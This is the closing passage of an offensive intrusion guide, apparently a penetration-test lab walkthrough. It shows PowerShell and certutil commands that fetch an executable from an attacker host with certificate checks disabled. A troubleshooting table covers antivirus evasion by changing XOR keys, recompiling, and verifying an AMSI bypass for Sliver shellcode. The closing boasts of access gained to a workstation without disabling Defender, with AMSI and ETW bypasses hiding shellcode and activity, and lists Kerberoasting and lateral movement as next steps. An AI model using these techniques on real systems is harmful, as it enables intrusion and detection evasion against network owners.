[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

# Download file
Invoke-WebRequest -Uri "https://<kali>/file.exe" -OutFile "C:\path\file.exe" -UseBasicParsing

# Alternative with certutil
certutil -urlcache -split -f https://<kali>/file.exe C:\path\file.exe
```

---

# CHAPTER 38: Common Errors and Solutions

| Error | Cause | Solution |
|-------|-------|----------|
| Virus detected | Signature match | Use different XOR key, recompile |
| Connection refused | Listener not running | Start listener on Kali |
| Session dies immediately | Crash or Defender kill | Check AMSI bypass is working |
| Cannot find mono | Not installed | `apt install mono-complete` |
| Port already in use | Another service running | Kill process using `lsof -i :443` |
| No sessions appear | Network issue | Check firewall, verify connectivity |
| Shellcode too large | Sliver is big (~10MB) | Normal, use `--skip-symbols` |
| Compilation error | Syntax issue | Check curly braces, using statements |

---

*END OF DOCUMENT*

*You now have gained initial access to WS01 as `vamsi.krishna` WITHOUT disabling Defender!*

*The AMSI and ETW bypasses in the loader prevent Defender from:*
- *Scanning our decrypted shellcode*
- *Logging our activities*

*Next steps: Domain enumeration with BloodHound, Kerberoasting, Lateral Movement*

*Use this knowledge ethically and legally!*
